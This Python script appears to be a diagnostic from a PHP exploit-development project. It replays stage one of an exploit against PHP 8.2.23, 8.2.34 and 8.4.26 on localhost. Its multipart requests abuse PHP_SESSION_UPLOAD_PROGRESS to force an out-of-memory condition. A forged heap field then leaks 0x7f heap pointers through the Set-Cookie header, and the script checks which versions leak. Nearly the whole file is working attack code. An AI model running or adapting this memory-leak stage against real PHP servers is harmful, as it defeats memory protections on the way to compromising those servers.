#!/usr/bin/env python3
"""Cookie diagnostic: stage-1 attempt on 8.2.23 vs 8.2.34 vs 8.4.26 (control).

Replays the exploit's stage-1 sequence (OOM request + readback request) and
measures the decoded Set-Cookie length + presence of 0x7f... heap pointers.
4096B with heap pointers = leak works (8.4.26); ~0B or no heap pointers =
broken family (8.2.34: OOM happens, leak fails).
"""
import os
import struct
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from exploit import Exploit, Target, parse_cookie, build_multipart, SID


def try_stage1(port: int, label: str) -> None:
    t = Target(f"http://127.0.0.1:{port}/", 30.0, False)
    e = Exploit(t, "id", huge_mb=256, verbose=False, profile="bookworm")
    e.rotate()
    # OOM request
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        e._file_part(),
        e._big_field(),
    ]
    t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
           read_cap=1 << 20, timeout=120)
    time.sleep(0.3)
    # readback request
    parts = [
        {"name": "PHPSESSID", "data": SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(e.stage1_n):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    resp = t.post(build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20)
    raw = parse_cookie(resp)
    heap = any(
        0x700000000000 <= int.from_bytes(raw[i:i + 8], "little") < 0x800000000000
        for i in range(0, max(0, len(raw) - 8), 8)
    )
    head = resp[:200].split(b"\r\n", 1)[0].decode("latin1")
    print(f"{label:8s} port={port}  {head}  cookie={len(raw):>6}B  "
          f"heap_ptr={'YES' if heap else 'no'}", flush=True)


if __name__ == "__main__":
    for label, port in [("8.2.23", 18115), ("8.2.34", 18111), ("8.4.26", 18113)]:
        try:
            try_stage1(port, label)
        except Exception as ex:
            print(f"{label:8s} port={port}  ERROR: {ex}", flush=True)
        time.sleep(1)
